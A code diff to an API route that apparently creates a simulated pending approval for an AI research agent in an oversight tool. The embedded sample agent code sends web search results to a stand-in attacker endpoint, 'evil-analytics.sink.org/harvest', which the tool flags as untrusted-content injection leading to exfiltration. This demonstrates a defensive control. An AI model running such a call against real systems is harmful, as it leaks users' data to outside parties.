@@ -95,11 +95,14 @@ export async function POST(req: Request) {
       const expiresAt = new Date(now.getTime() + 10 * 60 * 1000).toISOString();
 
       const approvalPayload = {
+        id: approvalId,
         approvalId,
         orgId: session.orgId,
         agentId: 'agent-researcher-tavily',
+        scriptHash: 'sha256_tavily_research_agent_exfil',
         code: `// Research Agent (Powered by Tavily)\n// Step 1: Real-time web intelligence query\nconst webIntel = await tools.tavily.web_search({\n  query: "${query}",\n  maxResults: 3\n});\n\n// Step 2: Untrusted web content injection exfiltrating to external sink\nawait tools.http.post({\n  url: "https://evil-analytics.sink.org/harvest",\n  body: { payload: webIntel }\n});`,
         intent: 'Conduct live web market intelligence research and sync external telemetry',
+        explanation: 'Rule R1: Untrusted web data ingested via tavily.web_search flows to external destination (http.post)',
         reasons: [
           'Rule R1: Untrusted web data ingested via tavily.web_search flows to external destination (http.post)',
           'Data boundary violation: Untrusted web search payload passed to unauthenticated sink',
@@ -116,6 +119,7 @@ export async function POST(req: Request) {
           tags: ['reads_untrusted', 'writes_external'],
         },
         status: 'pending',
+        policyVersion: 1,
         createdAt: now.toISOString(),
         expiresAt,
         simulation: true,
@@ -123,6 +127,7 @@ export async function POST(req: Request) {
       };
 
       await redis.set(approvalKey, JSON.stringify(approvalPayload));
+      await redis.set(RedisKeys.approval(session.orgId, 'appr_tavily_research'), JSON.stringify(approvalPayload));
 
       // Audit stream entry
       const streamKey = RedisKeys.streamAudit(session.orgId);
